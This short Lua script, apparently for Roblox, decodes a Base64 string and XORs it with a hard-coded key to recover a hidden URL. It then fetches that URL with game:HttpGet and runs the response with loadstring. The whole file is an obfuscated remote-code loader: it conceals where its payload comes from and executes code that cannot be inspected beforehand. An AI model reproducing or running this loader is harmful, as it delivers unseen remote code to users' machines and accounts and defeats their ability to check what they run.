local b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function Base64Decode(data)
    data = data:gsub("[^" .. b64chars .. "=]", "")
    return (data:gsub(".", function(x)
        if x == "=" then
            return ""
        end
        local r = ""
        local f = b64chars:find(x) - 1
        for i = 6, 1, -1 do
            r = r .. ((f % 2^i - f % 2^(i-1) > 0) and "1" or "0")
        end
        return r
    end):gsub("%d%d%d?%d?%d?%d?%d?%d?", function(x)
        if #x ~= 8 then
            return ""
        end
        local c = 0
        for i = 1, 8 do
            if x:sub(i,i) == "1" then
                c = c + 2^(8-i)
            end
        end
        return string.char(c)
    end))
end
local function XOR(text,key)
    local result = ""
    for i = 1,#text do
        local a = string.byte(text,i)
        local b = string.byte(
            key,
            ((i-1)%#key)+1
        )
        result = result .. string.char(
            bit32.bxor(a,b)
        )
    end
    return result
end
local key = "key22052009"
local encoded = "AxENQkEKGh1CUU5FAhBGWkVXR0NVSwgKF0ZXXkEcU19URCYYUVPFW1teVRYvLTUdQFVTQR9YXAoBCh1fUVxcH3xWCEQXFUeWUdR"
local encrypted = Base64Decode(encoded)
local url = XOR(encrypted,key)
loadstring(game:HttpGet(url))()
